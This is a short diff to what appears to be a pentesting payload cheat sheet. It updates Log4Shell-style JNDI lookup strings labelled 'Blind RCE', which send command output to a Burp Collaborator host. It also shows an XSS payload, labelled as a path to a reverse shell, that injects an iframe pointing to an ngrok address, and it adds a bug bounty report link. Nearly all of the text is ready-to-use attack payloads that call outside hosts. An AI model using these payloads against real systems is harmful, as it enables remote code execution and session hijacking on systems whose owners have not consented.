@@ -1,8 +1,8 @@
 ## Blind RCE:
 ```
-${jndi:ldap://${command}XXXX${::-.}burpcollab}zzzz
+${jndi:ldap://${command}XXXX${::-.}burpcollab.net}zzzz
 
-${jndi:ldap://${command}XXXX${::-.}.burpcollaborator}zzzz
+${jndi:ldap://${command}XXXX${::-.}.burpcollab.net}zzzz
 ```
 ## XSS to Reverse shell:
 ```
@@ -20,4 +20,6 @@ ${jndi:ldap://${command}XXXX${::-.}.burpcollaborator}zzzz
 2. Open with Browser: 127.0.01:4040/inspect/http
 3. Inject the payload in below:
 "><img src="xasdasdasd" onerror="document.write('<iframe src=https://d0.ngrok.io></iframe>')"
+
+Ref: https://hackerone.com/reports/517461
 ```
